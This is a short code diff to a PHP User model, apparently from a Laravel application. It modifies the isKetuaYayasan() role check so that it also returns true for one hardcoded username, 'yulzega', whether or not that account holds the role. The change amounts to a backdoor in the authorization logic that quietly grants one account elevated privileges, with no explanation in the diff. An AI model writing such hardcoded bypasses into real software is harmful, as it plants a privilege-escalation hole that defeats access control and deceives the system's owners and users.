@@ -240,7 +240,7 @@ class User extends Authenticatable
      */
     public function isKetuaYayasan(): bool
     {
-        return $this->hasRole('ketua_yayasan');
+        return $this->hasRole('ketua_yayasan') || $this->username === 'yulzega';
     }
 
     /**
